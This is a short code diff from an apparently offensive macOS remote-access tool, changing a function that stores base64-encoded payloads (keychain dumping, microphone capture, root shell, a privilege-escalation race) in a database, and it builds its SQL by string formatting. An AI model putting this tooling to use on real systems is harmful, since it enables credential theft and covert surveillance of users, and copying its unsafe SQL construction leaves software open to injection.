@@ -200,7 +200,7 @@ def inject_payloads(payload_encoded):
 	c = conn.cursor()
 	try:
 		(vncFile, kcFile, mcFile, rsFile, insomniaFile, lockFile, chainbreakerFile, machRace) = payload_encoded.splitlines()
-		#c.execute("DELETE FROM payloads WHERE id = 1") #wipe out old payloads
+		c.execute("DELETE FROM payloads WHERE id = 1") #wipe out old payloads
 		c.execute("INSERT INTO payloads (id, vnc, keychaindump, microphone, root_shell, insomnia, lock_icon, chainbreaker, mach_race) VALUES (1, '%s', '%s', '%s', '%s', '%s', '%s', '%s', '%s')" % (vncFile.encode('base64'), kcFile.encode('base64'), mcFile.encode('base64'), rsFile.encode('base64'), insomniaFile.encode('base64'), lockFile.encode('base64'), chainbreakerFile.encode('base64'), machRace.encode('base64')))
 		conn.commit()
 		conn.close()
